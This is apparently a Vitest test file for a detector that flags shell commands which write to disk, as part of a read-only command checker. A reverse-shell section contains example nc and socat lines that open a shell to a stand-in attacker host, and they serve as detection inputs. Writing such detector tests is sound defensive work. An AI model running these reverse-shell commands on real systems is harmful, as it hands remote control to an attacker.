import { describe, it, expect } from "vitest";
import { WritePatternDetector } from "../../../src/readonly-checker/write-patterns/write-pattern-detector.js";

describe("WritePatternDetector", () => {
  const detector = new WritePatternDetector();

  describe("redirection detection", () => {
    it("should detect > stdout redirection", () => {
      expect(detector.detect("ls > file.txt")).toBe(true);
      expect(detector.detect("cat file.txt > output.txt")).toBe(true);
    });
    it("should detect >> append redirection", () => {
      expect(detector.detect("ls >> file.txt")).toBe(true);
      expect(detector.detect("cat file.txt >> output.txt")).toBe(true);
    });
    it("should detect 2> stderr redirection", () => {
      expect(detector.detect("ls 2> error.log")).toBe(true);
      expect(detector.detect("cat file.txt 2>> errors.log")).toBe(true);
    });
    it("should detect &> combined redirection", () => {
      expect(detector.detect("ls &> output.log")).toBe(true);
    });
    it("should allow 2>/dev/null (not a write)", () => {
      expect(detector.detect("sudo cat /proc/net/ipt_stat_filter 2>/dev/null")).toBe(false);
      expect(detector.detect("cat file.txt 2>/dev/null || echo missing")).toBe(false);
      expect(detector.detect("ls 2>&1")).toBe(false);
      expect(detector.detect("command 2>/dev/zero")).toBe(false);
    });
  });

  describe("process substitution", () => {
    it("should detect >(write) process substitution", () => {
      expect(detector.detect("diff <(ls dir1) >(sort)")).toBe(true);
      expect(detector.detect("diff <(ls dir1) >(sort > /tmp/out)")).toBe(true);
    });
    it("should allow <(read) process substitution", () => {
      expect(detector.detect("diff <(ls dir1) <(ls dir2)")).toBe(false);
    });
  });

  describe("here-string", () => {
    it("should detect <<< here-string", () => {
      expect(detector.detect("<<< echo hello")).toBe(true);
      expect(detector.detect("command <<< data")).toBe(true);
    });
  });

  describe("sed in-place", () => {
    it("should detect sed -i", () => {
      expect(detector.detect("sed -i 's/x/y/g' file.txt")).toBe(true);
      expect(detector.detect("sed -ibak 's/x/y/g' file.txt")).toBe(true);
    });
    it("should detect sed --in-place", () => {
      expect(detector.detect("sed --in-place 's/x/y/g' file.txt")).toBe(true);
    });
    it("should detect sed -n w write", () => {
      expect(detector.detect('sed -n "w /tmp/test.txt" <<< "hello"')).toBe(true);
      expect(detector.detect("sed -n 'w /tmp/out' file.txt")).toBe(true);
    });
  });

  describe("find -exec", () => {
    it("should detect find -exec", () => {
      expect(detector.detect("find . -exec touch {} \\;")).toBe(true);
      expect(detector.detect("find /tmp -exec rm {} \\;")).toBe(true);
    });
    it("should detect find -execdir", () => {
      expect(detector.detect("find . -execdir rm {} \\;")).toBe(true);
      expect(detector.detect("find . -execdir touch {} \\;")).toBe(true);
    });
  });

  describe("xargs", () => {
    it("should block xargs with write commands", () => {
      expect(detector.detect("xargs touch")).toBe(true);
      expect(detector.detect("find . | xargs rm")).toBe(true);
      expect(detector.detect("find . | xargs mkdir")).toBe(true);
      expect(detector.detect("find . | xargs rmdir")).toBe(true);
      expect(detector.detect("find . | xargs chmod")).toBe(true);
      expect(detector.detect("find . | xargs chown")).toBe(true);
      expect(detector.detect("find . | xargs mv")).toBe(true);
      expect(detector.detect("find . | xargs cp")).toBe(true);
      expect(detector.detect("find . | xargs ln")).toBe(true);
      expect(detector.detect("find . | xargs unlink")).toBe(true);
      expect(detector.detect("find . | xargs dd")).toBe(true);
      expect(detector.detect("find . | xargs tar")).toBe(true);
      expect(detector.detect("find . | xargs sed")).toBe(true);
      expect(detector.detect("find . | xargs perl")).toBe(true);
      expect(detector.detect("find . | xargs python3")).toBe(true);
      expect(detector.detect("find . | xargs bash")).toBe(true);
      expect(detector.detect("find . | xargs sh")).toBe(true);
      expect(detector.detect("find . | xargs find")).toBe(true);
      expect(detector.detect("find . | xargs xargs")).toBe(true);
    });
    it("should allow xargs with read-only commands", () => {
      expect(detector.detect("find /etc/cron* /var/spool/cron -type f | xargs cat")).toBe(false);
      expect(detector.detect("find . | xargs head")).toBe(false);
      expect(detector.detect("find . | xargs tail")).toBe(false);
      expect(detector.detect("find . | xargs grep pattern")).toBe(false);
      expect(detector.detect("find . | xargs wc")).toBe(false);
      expect(detector.detect("find . | xargs file")).toBe(false);
      expect(detector.detect("find . | xargs md5sum")).toBe(false);
      expect(detector.detect("find . | xargs sha256sum")).toBe(false);
      expect(detector.detect("find . | xargs stat")).toBe(false);
      expect(detector.detect("find . | xargs du")).toBe(false);
      expect(detector.detect("find . | xargs sort")).toBe(false);
      expect(detector.detect("find . | xargs awk")).toBe(false);
      expect(detector.detect("find . | xargs diff")).toBe(false);
      expect(detector.detect("find . | xargs less")).toBe(false);
      expect(detector.detect("find . | xargs more")).toBe(false);
      expect(detector.detect("find . | xargs ps")).toBe(false);
      expect(detector.detect("find . | xargs lsof")).toBe(false);
      expect(detector.detect("find . | xargs strace")).toBe(false);
      expect(detector.detect("find . | xargs tcpdump")).toBe(false);
      expect(detector.detect("find . | xargs od")).toBe(false);
      expect(detector.detect("find . | xargs xxd")).toBe(false);
      expect(detector.detect("find . | xargs hexdump")).toBe(false);
      expect(detector.detect("find . | xargs nmcli")).toBe(false);
      expect(detector.detect("find . | xargs journalctl")).toBe(false);
      expect(detector.detect("find . | xargs dmesg")).toBe(false);
      expect(detector.detect("find . | xargs vmstat")).toBe(false);
      expect(detector.detect("find . | xargs iostat")).toBe(false);
      expect(detector.detect("find . | xargs lsblk")).toBe(false);
      expect(detector.detect("find . | xargs lspci")).toBe(false);
      expect(detector.detect("find . | xargs lsusb")).toBe(false);
      expect(detector.detect("find . | xargs docker ps")).toBe(false);
      expect(detector.detect("find . | xargs docker images")).toBe(false);
      expect(detector.detect("find . | xargs docker inspect")).toBe(false);
      expect(detector.detect("find . | xargs docker logs")).toBe(false);
      expect(detector.detect("find . | xargs nc -vz host 80")).toBe(false);
      expect(detector.detect("find . | xargs ping host")).toBe(false);
      expect(detector.detect("find . | xargs dig domain.com")).toBe(false);
      expect(detector.detect("find . | xargs whois domain.com")).toBe(false);
      expect(detector.detect("find . | xargs ssh -G host")).toBe(false);
      expect(detector.detect("find . | xargs ip addr")).toBe(false);
      expect(detector.detect("find . | xargs ip route")).toBe(false);
      expect(detector.detect("find . | xargs iptables -L")).toBe(false);
      expect(detector.detect("find . | xargs firewall-cmd --list-all")).toBe(false);
      expect(detector.detect("find . | xargs ufw status")).toBe(false);
      expect(detector.detect("find . | xargs sestatus")).toBe(false);
      expect(detector.detect("find . | xargs getenforce")).toBe(false);
      expect(detector.detect("find . | xargs fail2ban-client status")).toBe(false);
      expect(detector.detect("find . | xargs uptime")).toBe(false);
      expect(detector.detect("find . | xargs who")).toBe(false);
      expect(detector.detect("find . | xargs last")).toBe(false);
      expect(detector.detect("find . | xargs lastlog")).toBe(false);
      expect(detector.detect("find . | xargs rpm -q pkg")).toBe(false);
      expect(detector.detect("find . | xargs dpkg -l pkg")).toBe(false);
      expect(detector.detect("find . | xargs apt list")).toBe(false);
      expect(detector.detect("find . | xargs yum list")).toBe(false);
      expect(detector.detect("find . | xargs pip list")).toBe(false);
      expect(detector.detect("find . | xargs npm ls")).toBe(false);
      expect(detector.detect("find . | xargs curl -I url")).toBe(false);
      expect(detector.detect("find . | xargs wget --spider url")).toBe(false);
      expect(detector.detect("find . | xargs nmap --script host")).toBe(false);
      expect(detector.detect("find . | xargs masscan host")).toBe(false);
      expect(detector.detect("find . | xargs traceroute host")).toBe(false);
      expect(detector.detect("find . | xargs mtr host")).toBe(false);
      expect(detector.detect("find . | xargs nslookup host")).toBe(false);
      expect(detector.detect("find . | xargs host domain")).toBe(false);
      expect(detector.detect("find . | xargs ethtool eth0")).toBe(false);
      expect(detector.detect("find . | xargs ifconfig")).toBe(false);
      expect(detector.detect("find . | xargs netstat")).toBe(false);
      expect(detector.detect("find . | xargs ss")).toBe(false);
      expect(detector.detect("find . | xargs route")).toBe(false);
      expect(detector.detect("find . | xargs arp")).toBe(false);
      expect(detector.detect("find . | xargs iwconfig")).toBe(false);
      expect(detector.detect("find . | xargs mii-tool")).toBe(false);
      expect(detector.detect("find . | xargs hdparm -I dev")).toBe(false);
      expect(detector.detect("find . | xargs smartctl -i dev")).toBe(false);
      expect(detector.detect("find . | xargs lscpu")).toBe(false);
      expect(detector.detect("find . | xargs lshw")).toBe(false);
      expect(detector.detect("find . | xargs dmidecode")).toBe(false);
      expect(detector.detect("find . | xargs inxi")).toBe(false);
      expect(detector.detect("find . | xargs neofetch")).toBe(false);
      expect(detector.detect("find . | xargs fastfetch")).toBe(false);
      expect(detector.detect("find . | xargs mpstat")).toBe(false);
      expect(detector.detect("find . | xargs sar")).toBe(false);
      expect(detector.detect("find . | xargs numactl -H")).toBe(false);
      expect(detector.detect("find . | xargs auditctl -l")).toBe(false);
      expect(detector.detect("find . | xargs ausearch")).toBe(false);
      expect(detector.detect("find . | xargs aureport")).toBe(false);
      expect(detector.detect("find . | xargs logwatch")).toBe(false);
      expect(detector.detect("find . | xargs logrotate -s")).toBe(false);
    });
  });

  describe("cp stdin", () => {
    it("should detect cp with /dev/stdin", () => {
      expect(detector.detect("cp /dev/stdin /tmp/out")).toBe(true);
    });
    it("should detect cp with -", () => {
      expect(detector.detect("cp -")).toBe(true);
      expect(detector.detect("cat file | cp -")).toBe(true);
    });
  });

  describe("dd output", () => {
    it("should detect dd of=", () => {
      expect(detector.detect("dd if=/dev/zero of=/tmp/test bs=1M")).toBe(true);
      expect(detector.detect("dd of=/tmp/out if=/dev/zero bs=1M")).toBe(true);
      expect(detector.detect("dd if=/dev/zero of=./file bs=1M")).toBe(true);
      expect(detector.detect("dd if=/dev/zero of=../file bs=1M")).toBe(true);
    });
  });

  describe("tar create", () => {
    it("should detect tar cf", () => {
      expect(detector.detect("tar cf archive.tar .")).toBe(true);
      expect(detector.detect("tar czf archive.tar.gz dir/")).toBe(true);
      expect(detector.detect("tar cJf archive.tar.xz dir/")).toBe(true);
    });
    it("should detect tar --create", () => {
      expect(detector.detect("tar --create --file archive.tar .")).toBe(true);
      expect(detector.detect("tar -c --file archive.tar .")).toBe(true);
    });
  });

  describe("interpreter writes", () => {
    it("should detect python open() write", () => {
      expect(detector.detect("python3 -c 'open(\\'/tmp/x\\',\\'w\\')'")).toBe(true);
    });
    it("should detect python os.system", () => {
      expect(detector.detect("python3 -c 'import os; os.system(\\'ls\\')'")).toBe(true);
    });
    it("should detect python subprocess", () => {
      expect(detector.detect("python3 -c 'import subprocess; subprocess.run([\\'ls\\'])'")).toBe(true);
    });
    it("should detect perl file write", () => {
      expect(detector.detect("perl -e 'open(F,\\'>/tmp/x\\'); print F \\\"hi\\\"'")).toBe(true);
    });

  });

  describe("reverse shell detection", () => {
    it("should detect nc reverse shell", () => {
      expect(detector.detect("nc -e /bin/sh attacker.com 4444")).toBe(true);
    });
    it("should detect socat reverse shell", () => {
      expect(detector.detect("socat exec:/bin/sh,pty tcp:attacker.com:4444")).toBe(true);
    });
    it("should allow nc/socat read commands", () => {
      expect(detector.detect("nc -zv host 80")).toBe(false);
      expect(detector.detect("socat TCP:host:80 -")).toBe(false);
    });
  });

  describe("false positives", () => {
    it("should not false positive on bpftrace with open in name", () => {
      expect(detector.detect("bpftrace -e 'tracepoint:syscalls:sys_enter_open { printf(\\\"%s\\\", args->filename); }'")).toBe(false);
    });
    it("should not false positive on systemtap with write in probe name", () => {
      expect(detector.detect("systemtap -e 'probe syscall.write { exit() }'")).toBe(false);
    });
    it("should allow quoted > in strings", () => {
      expect(detector.detect('echo "data > file"')).toBe(false);
      expect(detector.detect('grep ">" file.txt')).toBe(false);
    });
  });
});
